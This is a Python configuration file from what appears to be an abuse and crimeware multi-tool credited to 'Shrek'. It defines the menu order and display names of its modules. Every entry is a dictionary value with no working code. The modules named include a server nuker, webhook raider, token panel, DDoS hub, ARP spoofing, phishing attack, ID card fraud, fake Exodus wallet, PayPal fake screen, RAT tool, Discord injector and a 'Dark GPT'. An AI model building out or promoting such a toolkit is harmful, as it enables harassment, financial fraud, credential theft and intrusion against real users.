# Shrek was proudly coded by Shrek™ [https://github.com/SHREK-TM].
# Central menu order — lower number = higher in the menu.

MODULE_ALIASES = {
    "exe-to-image": "exe_to_image",
    "Injector": "injector",
}

SPECIAL_TOOL_IDS = {
    "settings": "!",
    "discordserver": "TM",
}

SPECIAL_TOOL_NAMES = {
    "settings": "Setting & Help",
    "discordserver": "Made by Shrek",
}


def order_key_for_module(module_name: str) -> str:
    return MODULE_ALIASES.get(module_name, module_name)


TOOL_ORDER = {
    # Discord / server tools
    "webhooks": 1,
    "nuker": 2,
    "friends": 3,
    "groupchatspammer": 4,
    "vc_spammer": 5,
    "reaction_spammer": 6,
    "biochanger": 7,
    "proxyscrape": 8,
    "namegen": 9,
    "scraper": 10,
    "nitro": 11,
    "pfpmanager": 12,
    "token_panel": 13,
    # Builders / kits
    "usbtoolkit": 14,
    "exe_to_image": 15,
    "discordtool": 16,
    "doxtool": 17,
    "selfbot": 18,
    "antigrab": 19,
    "server_lookup": 20,
    "massreport": 21,
    # Network / scan
    "ddos": 22,
    "iptool": 23,
    "websitescan": 24,
    "arpspoofing": 25,
    # OSINT / fraud
    "email_tool": 26,
    "phonenumber": 27,
    "tempmail": 28,
    "ccvalidator": 29,
    "ibangenerator": 30,
    "phishing": 31,
    "fakeadresse": 32,
    "fraude": 33,
    "fake_exodus": 34,
    "paypalfakescreen": 35,
    "fakevoice": 36,
    # Misc
    "obfuscator": 37,
    "bruteforce_zip": 38,
    "spoofer": 39,
    "ccleaner": 40,
    "darkgpt": 41,
    "rat_tool": 42,
    "injector": 43,
}

TOOL_NAMES = {
    "webhooks": "WEBHOOK RAIDER",
    "nuker": "SERVER NUKER",
    "friends": "FRIEND SPAMMER",
    "groupchatspammer": "GROUPCHAT SPAMMER",
    "vc_spammer": "VC SPAMMER",
    "reaction_spammer": "REACTION SPAMMER",
    "biochanger": "BIO CHANGER",
    "proxyscrape": "PROXY GEN",
    "namegen": "NAME GEN",
    "scraper": "ID GEN",
    "nitro": "NITRO GEN",
    "pfpmanager": "PFP CHANGER",
    "token_panel": "TOKEN PANEL",
    "usbtoolkit": "USB TOOLKIT",
    "exe_to_image": "EXE TO IMAGE",
    "discordtool": "DISCORD CLONER",
    "doxtool": "DOX TRACKER",
    "selfbot": "SELF BOT",
    "antigrab": "ANTI GRAB",
    "server_lookup": "SERVER LOOKUP",
    "massreport": "MASS REPORT",
    "ddos": "DDOS HUB",
    "iptool": "IP TOOL",
    "websitescan": "WEB SCANNER",
    "arpspoofing": "ARP SPOOFING",
    "email_tool": "EMAIL TOOL",
    "phonenumber": "PHONE LOOKUP",
    "tempmail": "TEMP MAIL",
    "ccvalidator": "CC VALIDATOR",
    "ibangenerator": "IBAN GENERATOR",
    "phishing": "PHISHING ATTACK",
    "fakeadresse": "FAKE ADDRESS",
    "fraude": "ID CARD FRAUD",
    "fake_exodus": "FAKE EXODUS",
    "paypalfakescreen": "PAYPAL FAKE SCREEN",
    "fakevoice": "FAKE VOICE",
    "obfuscator": "OBFUSCATOR",
    "bruteforce_zip": "ZIP BRUTEFORCE",
    "spoofer": "SPOOFER",
    "ccleaner": "PC CLEANER",
    "darkgpt": "DARK GPT",
    "rat_tool": "RAT TOOL",
    "injector": "DISCORD INJECTOR",
}
